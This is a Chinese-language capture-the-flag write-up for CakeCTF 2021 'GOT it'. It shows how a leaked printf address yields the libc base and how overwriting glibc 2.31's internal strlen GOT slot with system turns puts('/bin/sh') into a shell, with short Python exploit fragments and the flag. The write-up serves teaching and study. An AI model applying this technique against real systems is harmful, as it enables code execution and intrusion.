# CakeCTF2021 GOT it

## 题目简述

程序泄露 `main` 和 `printf` 地址，随后允许攻击者向任意地址写入一个 8 字节值，最后调用 `puts(arg)`。主程序启用了 Full RELRO，直接覆盖主程序 GOT 不可行；但题目同时提供了精确版本的 glibc，真正目标是 libc 自己仍可写的内部 GOT 槽。

## 解题过程

### 由 printf 泄露定位 libc

程序打印了运行时 `printf` 地址，因此可以按提供的 `libc-2.31.so` 计算：

```python
libc_base = leaked_printf - libc.symbol("printf")
system = libc_base + libc.symbol("system")
```

ASLR 只改变基址，不会改变同一份 libc 内的相对偏移。

### 改写 libc 内部 strlen 槽

Full RELRO 保护的是主 ELF 完成重定位后的 GOT；它并不自动使所有已加载共享库的全部内部间接调用表只读。在题目给出的 glibc 2.31 中，偏移 `0x1eb0a8` 是 `__strlen_avx2` 的内部 GOT 槽。官方解法把它改成 `system`：

```python
got_strlen = libc_base + 0x1eb0a8
send_address(got_strlen)
send_value(system)
send_data(b"/bin/sh")
```

随后程序执行 `puts(arg)`。这条 glibc 路径内部需要调用 `strlen(arg)`；槽被劫持后，实际发生的是 `system(arg)`。令 `arg` 为 `/bin/sh` 即可取得 shell，再读取 flag：

```text
CakeCTF{*ABS*+0x190717@IGOTIT}
```

偏移与给定 libc 构建严格绑定。复现时应使用附件库验证重定位，而不能把 `0x1eb0a8` 当成跨版本常量。

## 方法总结

- Full RELRO 不是“进程内所有 GOT 均不可写”，需要逐个 ELF 检查实际映射权限和重定位位置。
- 已知 libc 泄露加任意地址写时，除传统 hook 外，也应检查 libc 内部函数分派槽和可写 GOT。
- 劫持目标必须位于后续确定会经过的调用链上；本题利用的是 `puts -> strlen`。
